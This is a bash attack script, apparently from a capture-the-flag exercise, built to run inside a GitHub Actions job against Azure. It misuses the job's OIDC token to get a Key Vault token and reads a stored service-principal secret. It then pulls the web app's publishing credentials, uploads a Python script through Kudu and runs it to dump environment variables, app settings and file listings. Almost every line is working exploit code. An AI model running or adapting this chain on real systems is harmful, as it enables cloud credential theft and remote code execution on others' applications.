#!/usr/bin/env bash
set +e
echo "=====PWN11_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" -d grant_type=client_credentials --data-urlencode "scope=https://vault.azure.net/.default" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
RJ=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4")
RID=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("appId",""))' 2>/dev/null)
RSC=$(echo "$RJ" | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["value"]).get("clientSecret",""))' 2>/dev/null)
RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" -d "client_id=$RID" -d grant_type=client_credentials --data-urlencode "client_secret=$RSC" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "rpt_arm=${#RAT}"
PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "kudu=${PU:-FAIL}"
SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
cat > /tmp/z.py <<'ZPY'
import os,json,sys
print("===ENV===")
for k,v in sorted(os.environ.items()):
    print(k,"=",v)
print("===SETTINGS===")
try:
    sys.path.insert(0,"/home/site/wwwroot")
    from app import load_settings
    print(json.dumps(load_settings()))
except Exception as e:
    print("err:",e)
print("===LS===")
for root in ["/home/site/wwwroot","/home/site/config","/home/site/data","/tmp"]:
    try:
        for f in sorted(os.listdir(root)): print(root+"/"+f)
    except Exception: pass
print("===DONE===")
ZPY
UP=$(curl -sS -m 30 -u "$PU:$PP" -X PUT "$SCM/api/vfs/site/wwwroot/z.py" --data-binary @/tmp/z.py -o /dev/null -w "%{http_code}")
echo "vfs_put=$UP"
OUT=$(curl -sS -m 90 -u "$PU:$PP" -H "Content-Type: application/json" -X POST "$SCM/api/command" -d '{"command":"python3 z.py","dir":"/home/site/wwwroot"}')
echo "$OUT" | python3 -c 'import sys,json;d=json.load(sys.stdin);print((d.get("Output") or d.get("Error") or "")[:6000])' 2>/dev/null
echo "$OUT" | grep -o 'DF26{[^}]*}' | head -1
echo "=====PWN11_END====="